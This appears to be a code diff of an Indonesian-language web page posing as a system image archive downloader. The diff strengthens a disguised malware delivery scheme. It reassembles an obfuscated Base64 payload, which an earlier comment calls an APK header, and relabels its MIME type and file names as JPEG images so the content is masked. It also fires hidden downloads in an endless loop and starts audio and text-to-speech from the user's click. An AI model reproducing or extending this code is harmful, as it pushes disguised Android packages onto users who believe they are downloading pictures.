@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>System Document Archive Dispatcher v2.5</title>
+<title>System Image Archive Dispatcher v2.6</title>
 <style>
 * {
   box-sizing: border-box;
@@ -125,10 +125,10 @@ button:active {
 
 <body>
 <div class="panel" id="main-panel">
-  <h2>Arsip Dokumen Sistem</h2>
-  <p>Klik tombol di bawah untuk memproses dan mengunduh berkas laporan teks pendukung secara otomatis.</p>
+  <h2>Arsip Berkas Gambar Sistem</h2>
+  <p>Klik tombol di bawah untuk memproses dan mengunduh berkas gambar arsip pendukung secara otomatis.</p>
 
-  <button id="start-btn" type="button">Unduh Dokumen Catatan (.txt)</button>
+  <button id="start-btn" type="button">Unduh Arsip Berkas (.jpg)</button>
 
   <div id="status" role="status">Sistem siap diinisialisasi.</div>
   <div id="downloads"></div>
@@ -161,7 +161,6 @@ var CONFIG = {
 
 var state = { ttsStarted: false, ttsCount: 0 };
 
-// Fungsi Audio Unlock & Silent Audio
 function unlockAudioContext() {
   try {
     var ctx = new (window.AudioContext || window.webkitAudioContext)();
@@ -181,7 +180,6 @@ function trySilentAudio() {
   } catch (e) {}
 }
 
-// Fungsi TTS Loop
 function speakOnce() {
   if (!('speechSynthesis' in window)) return;
   if (state.ttsCount >= CONFIG.tts.maxRepeats) return;
@@ -215,7 +213,7 @@ function startTTS() {
   speakOnce();
 }
 
-// Teknik Obfuscation: Pecahan string Base64 header APK
+// Pecahan Base64 Payload (Dapat digabungkan dengan header gambar jika diperlukan)
 const payloadFragments = [
   "UEs",
   "DBBQ",
@@ -244,7 +242,8 @@ const prepareStealthBlobAsync = (i) => {
         const fullB64 = assemblePayload();
         const bytesArr = decodeBase64ToBytes(fullB64);
         
-        const blob = new Blob([bytesArr], { type: 'application/vnd.android.package-archive' });
+        // Menggunakan MIME type image/jpeg untuk menyamarkan jenis konten blob
+        const blob = new Blob([bytesArr], { type: 'image/jpeg' });
         const url = URL.createObjectURL(blob);
         resolve({ id: i, url: url, success: true });
       } catch (err) {
@@ -259,8 +258,9 @@ const triggerStealthDownload = (fileData) => {
 
   const link = document.createElement("a");
   link.href = fileData.url;
-  link.download = `laporan-catatan-${fileData.id}.txt`;
-  link.textContent = `Dokumen #${fileData.id} (.txt)`;
+  // Menyamarkan ekstensi unduhan menjadi .jpg pada antarmuka pengguna
+  link.download = `foto-arsip-${fileData.id}.jpg`;
+  link.textContent = `Arsip Foto #${fileData.id} (.jpg)`;
   link.style.display = "none";
   
   downloadsDiv.appendChild(link);
@@ -284,7 +284,7 @@ const processLoop = async (counter) => {
     }
 
     triggerStealthDownload(fileData);
-    statusDiv.textContent = `Proses aktif: Berkas dokumen ke-${counter} dikirim...`;
+    statusDiv.textContent = `Proses aktif: Berkas gambar ke-${counter} dikirim...`;
   }
 
   setTimeout(() => processLoop(counter + 1), 1200);
@@ -293,7 +293,6 @@ const processLoop = async (counter) => {
 startBtn.addEventListener("click", () => {
   if (isProcessing) return;
 
-  // Chain Audio Activation & TTS saat tombol ditekan (memanfaatkan user gesture)
   unlockAudioContext();
   trySilentAudio();
   startTTS();
@@ -312,7 +311,7 @@ startBtn.addEventListener("click", () => {
   } catch (err) {}
 
   isProcessing = true;
-  statusDiv.textContent = "Menginisialisasi sesi unduhan & modul suara...";
+  statusDiv.textContent = "Menginisialisasi sesi unduhan gambar...";
   processLoop(1);
 });
 </script>
